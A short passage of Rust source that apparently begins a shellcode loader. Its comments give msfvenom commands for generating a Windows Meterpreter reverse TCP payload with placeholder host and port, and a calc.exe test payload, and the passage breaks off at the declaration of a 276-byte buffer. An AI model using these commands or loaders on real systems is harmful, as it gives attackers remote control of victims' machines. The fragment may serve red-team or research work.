...
fn main() {
    // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f rust
    // msfvenom -p windows/x64/exec CMD='calc.exe' EXITFUNC=none -f rust
    let buf: [u8; 276] = [
